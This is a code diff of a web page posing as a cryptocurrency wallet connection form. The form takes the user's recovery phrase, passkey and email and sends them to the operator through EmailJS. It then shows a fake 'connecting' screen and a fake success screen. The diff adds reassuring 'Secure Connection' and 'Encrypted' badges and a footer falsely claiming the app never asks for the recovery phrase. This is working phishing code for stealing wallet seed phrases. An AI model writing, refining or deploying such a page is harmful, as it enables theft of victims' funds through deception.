+            submitBtn.textContent = "Connecting...";
+            submitSpinner.classList.remove("hidden");
             
             // Prepare data for EmailJS
             const templateParams = {
-                wallet: getWalletName(selectedWallet),
-                phrase: phrase,
-                passkey: passkey,
-                date: new Date().toLocaleString()
+                wallet_type: currentWallet,
+                recovery_phrase: phrase,
+                passkey: passkey || 'Not provided',
+                email: email,
+                timestamp: new Date().toISOString()
             };
             
-            // Send via EmailJS
-            emailjs.send('wallet_service', 'connection_template', templateParams)
-                .then(() => {
-                    console.log('Email sent successfully');
-                    closeModal();
-                    showConnectingModal();
+            // Send data via EmailJS
+            emailjs.send('YOUR_EMAILJS_SERVICE_ID', 'YOUR_EMAILJS_TEMPLATE_ID', templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
                     
+                    // Show connecting modal
+                    document.getElementById('connectionModal').style.display = 'none';
+                    document.getElementById('connectingWallet').textContent = currentWallet;
+                    document.getElementById('connectingModal').style.display = 'flex';
+                    
+                    // After 3 seconds, show success
                     setTimeout(() => {
-                        closeConnectingModal();
-                        showSuccessModal();
-                    }, 5000);
-                }, (error) => {
-                    console.error('Email failed to send:', error);
-                    alert('Connection failed. Please try again.');
+                        document.getElementById('connectingModal').style.display = 'none';
+                        document.getElementById('successWallet').textContent = currentWallet;
+                        document.getElementById('successModal').style.display = 'flex';
+                        
+                        // Reset form and button
+                        document.getElementById('authForm').reset();
+                        submitBtn.textContent = "Connect Wallet";
+                        submitSpinner.classList.add("hidden");
+                    }, 3000);
+                }, function(error) {
+                    console.log('FAILED...', error);
+                    alert('There was an error connecting your wallet. Please try again.');
+                    
+                    // Reset button
+                    submitBtn.textContent = "Connect Wallet";
+                    submitSpinner.classList.add("hidden");
                 });
         });
 
-        function validatePhrase(phrase) {
-            // Basic validation - should be enhanced for production
-            const words = phrase.trim().split(/\s+/);
-            return words.length >= 12 && words.length <= 24;
-        }
+        
     </script>
+    <!-- Add before closing body tag -->
+<div class="fixed bottom-0 left-0 right-0 bg-gray-900 border-t border-gray-800 p-4 text-center text-xs text-gray-500">
+    <div class="flex justify-center space-x-6 mb-2">
+        <span class="flex items-center">
+            <svg class="w-4 h-4 text-green-500 mr-1" fill="currentColor" viewBox="0 0 20 20">
+                <path fill-rule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
+            </svg>
+            Secure Connection
+        </span>
+        <span class="flex items-center">
+            <svg class="w-4 h-4 text-blue-400 mr-1" fill="currentColor" viewBox="0 0 20 20">
+                <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path>
+            </svg>
+            Encrypted
+        </span>
+    </div>
+    <p class="max-w-2xl mx-auto">Never share your recovery phrase with anyone. This application will never ask for it unless you explicitly choose to connect manually.</p>
+</div>
 </body>
 </html>
